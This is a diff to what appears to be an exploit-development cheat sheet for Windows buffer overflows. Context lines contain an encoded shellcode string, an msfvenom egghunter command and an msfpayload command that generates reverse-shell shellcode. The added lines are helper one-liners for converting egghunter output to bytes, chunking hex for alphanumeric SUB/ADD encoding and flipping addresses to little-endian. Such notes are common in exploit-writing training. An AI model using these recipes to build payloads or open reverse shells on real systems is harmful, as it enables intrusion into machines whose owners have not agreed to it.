@@ -24,6 +24,29 @@ shellcode = "IIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIKL2JZKPMM
 msf-egghunter -f raw -e dead | msfvenom -p - --platform windows -a x86 -b '\x2e' -f python -v egghunter
 ```
 
+# One-liner to convert to bin file
+```
+egghunter.rb  -f raw  -e b00b | xxd  |awk -F":" '{print $2}' |sed 's/ //g' |awk '{print substr($0,0,32)}' | sed 's/\(..\)/\\x\1/g' |tac
+```
+
+# Hexdump files in 4bytes chunks; uselful if you want to (alphanum) encode a payload with SUB or ADD
+```
+hexdump -e '4/1 "%02X" "\n"' FILE
+```
+
+# Switch around an address to little endian (python), helpful when your brain won't work
+```
+a = '0040A76F'
+"".join(reversed([a[i:i+2] for i in range(0, len(a), 2)]))
+output: '6FA74000'
+```
+
+# Look out for \xCC
+```
+# debugger no likey
+```
+
+
 # Hex bytes only
 ```
 msfpayload win32_reverse LHOST=127.0.0.1 EXITFUNC=thread LPORT=1337 -b  "\x00" C | grep '"' |tr -d " " |tr -d "\n" |sed 's/[\"x;]//g'
